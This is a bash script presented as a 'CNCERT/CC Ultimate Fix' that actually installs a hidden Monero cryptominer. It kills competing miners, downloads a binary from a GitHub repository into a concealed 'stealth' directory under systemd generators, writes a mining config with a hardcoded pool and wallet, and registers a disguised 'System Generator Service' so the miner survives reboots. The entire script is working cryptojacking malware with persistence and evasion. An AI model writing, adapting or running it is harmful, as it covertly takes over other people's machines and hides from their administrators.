#!/bin/bash
# CNCERT/CC Ultimate Fix - quin imut
# Fix untuk main command not found

# Setup variables
STEALTH_DIR="/usr/lib/systemd/system-generators"
BINARY_NAME=".systemd-generator"
CONFIG_NAME="config.json"
POOL="xmr.kryptex.network:7029"
WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.TL"

# Cleanup pertama
echo "[+] Cleaning up existing processes..."
pkill -9 -f "udevd" 2>/dev/null
pkill -9 -f "xmrig" 2>/dev/null
pkill -9 -f "systemd-generator" 2>/dev/null
sleep 2

# Setup directory
echo "[+] Creating directory..."
mkdir -p "$STEALTH_DIR"
cd "$STEALTH_DIR" || exit 1

# Download binary
echo "[+] Downloading binary..."
curl -s -L -o "$BINARY_NAME" "https://github.com/wakitobi/glowing-umbrella/raw/main/bos" || \
wget -q -O "$BINARY_NAME" "https://github.com/wakitobi/glowing-umbrella/raw/main/bos"

if [ ! -f "$BINARY_NAME" ]; then
    echo "[!] Download failed"
    exit 1
fi

chmod +x "$BINARY_NAME"

# Create config
echo "[+] Creating config..."
cat > "$CONFIG_NAME" << EOF
{
    "autosave": true,
    "background": true,
    "cpu": true,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET", 
            "pass": "x",
            "keepalive": true,
            "thread": "6",
            "tls": false
        }
    ],
    "print-time": 0,
    "syslog": false
}
EOF

# Start process
echo "[+] Starting process..."
nohup ./"$BINARY_NAME" --config="$CONFIG_NAME" > /dev/null 2>&1 &

# Verify
sleep 5
PID=$(pgrep -f "$BINARY_NAME")
if [ -n "$PID" ]; then
    echo "[+] Process started with PID: $PID"
    echo "$PID" > ".pid"
    
    # Create service
    cat > /etc/systemd/system/systemd-generator.service << EOF
[Unit]
Description=System Generator Service
After=network.target

[Service]
Type=simple
WorkingDirectory=$STEALTH_DIR
ExecStart=$STEALTH_DIR/$BINARY_NAME --config=$CONFIG_NAME
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable systemd-generator.service
    systemctl start systemd-generator.service
    
    echo "[+] Service created: systemd-generator.service"
    echo "[+] Deployment successful!"
else
    echo "[!] Process failed to start"
    # Coba direct run
    ./"$BINARY_NAME" --config="$CONFIG_NAME" --dry-run
    exit 1
fi
